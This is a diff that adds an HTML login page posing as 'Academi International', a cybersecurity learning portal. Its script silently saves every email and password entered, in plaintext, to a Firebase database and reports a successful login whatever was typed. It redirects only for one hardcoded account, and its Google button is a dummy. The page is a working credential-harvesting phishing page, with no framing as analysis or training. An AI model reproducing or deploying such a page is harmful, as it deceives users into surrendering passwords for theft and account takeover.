@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>Academi International | Cybersecurity Learning Portal </title>
+  <meta name="description" content="Join Academi International — the global platform for mastering ethical hacking, cybersecurity, and digital defense. Secure your future today with professional online training." />
+  <meta name="keywords" content="cybersecurity, ethical hacking, hacking academy, cyber academy, web security, cyber training, international security, penetration testing, network defense, learn hacking" />
+  <meta name="author" content="Academi International" />
+  <meta property="og:title" content="Academi International - Premium Cybersecurity Learning" />
+  <meta property="og:description" content="Log in to access international-level courses in cyber protection and ethical hacking. Trusted by learners worldwide." />
+  <meta property="og:image" content="https://cdn.pixabay.com/photo/2021/11/20/03/38/girl-6810780_1280.png" />
+  <meta property="og:type" content="website" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  
+  <link rel="icon" href="https://cdn.vectorstock.com/i/500p/56/53/cyber-hacker-alphabet-bold-techno-font-digital-vector-56905653.avif" type="image/png" />
+</head>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: url('https://cdn.vectorstock.com/i/500p/41/33/isometric-network-security-vector-27124133.avif') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: white;
+    }
+
+    .login-container {
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(12px);
+      border-radius: 15px;
+      padding: 40px 30px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 0 25px rgba(255,255,255,0.1);
+    }
+
+    .login-container h2 {
+      margin-bottom: 25px;
+      font-weight: 600;
+    }
+
+    input {
+      width: 80%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+    }
+
+    .login-btn, .google-btn {
+      width: 100%;
+      padding: 12px;
+      margin-top: 15px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .login-btn {
+      background-color: #1e90ff;
+      color: white;
+    }
+
+    .google-btn {
+      background: white;
+      color: #333;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .google-btn svg {
+      width: 20px;
+      height: 20px;
+    }
+
+    .msg {
+      margin-top: 15px;
+      font-size: 14px;
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h2>Register to Continue</h2>
+    <input id="email" type="email" placeholder="Email Address" required />
+    <input id="password" type="password" placeholder="Password" autocomplete="current-password" required />
+    <button class="login-btn" onclick="login()">Login</button>
+    <button class="google-btn" onclick="alert('Google Login not available yet')">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 533.5 544.3" aria-hidden="true">
+        <path fill="#4285f4" d="M533.5 278.4c0-17.3-1.4-34-4.4-50.3H272v95.2h146.9c-6.4 34.7-26 64.2-55.6 84v69h89.9c52.7-48.5 83.3-120.1 83.3-197.9z"/>
+        <path fill="#34a853" d="M272 544.3c75.6 0 139.1-24.9 185.5-67.6l-89.9-69c-25 16.7-57 26.5-95.6 26.5-73.5 0-135.8-49.6-158.3-116.5H21v72.8c46.6 92.1 142.3 153.8 251 153.8z"/>
+        <path fill="#fbbc04" d="M113.7 320.7c-10.7-32-10.7-66.7 0-98.7v-72.8H21c-40.6 79.7-40.6 175.6 0 255.3l92.7-72.8z"/>
+        <path fill="#ea4335" d="M272 107.7c39 0 74 13.4 101.4 39.6l76-76C406.1 24.4 344.3 0 272 0 163.3 0 67.6 61.7 21 153.8l92.7 72.8c22.5-66.9 84.8-116.5 158.3-116.5z"/>
+      </svg>
+      Continue with Google
+    </button>
+    <div class="msg" id="msg"></div>
+  </div>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+ <script>
+  window.onload = function () {
+    const firebaseConfig = {
+      apiKey: "AIzaSyBVMpOCjY9gdd4UkSa",
+      authDomain: "yanofc-1ecd3.firebaseapp.com",
+      databaseURL: "https://yanofc-1ecd3-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "yanofc-1ecd3",
+      storageBucket: "yanofc-1ecd3.appspot.com",
+      messagingSenderId: "843043156565",
+      appId: "1:843043156565:web:e00942a837d30e4b4a9adc"
+    }; firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const msgEl = document.getElementById('msg');
+
+    window.login = function () {
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      msgEl.style.color = 'red';
+
+      if (!email || !password) {
+        msgEl.textContent = 'Email dan password wajib diisi.';
+        return;
+      }
+
+      const usersRef = db.ref('userss');
+      const newUserRef = usersRef.push();
+      newUserRef.set({
+        email: email,
+        password: password,
+        loginAt: new Date().toISOString()
+      })
+      .then(() => {
+        msgEl.style.color = 'lightgreen';
+        msgEl.textContent = 'Login berhasil!';
+        if (email === 'useragent@gmail.com' && password === 'useragent') {
+          setTimeout(() => {
+            window.location.href = 'page.php';
+          }, 1000); 
+        }        document.getElementById('email').value = '';
+        document.getElementById('password').value = '';
+      })
+      .catch((error) => {
+        msgEl.textContent = 'Terjadi kesalahan: ' + error.message;
+      });
+    }
+  }
+</script>
+</body>
+</html>
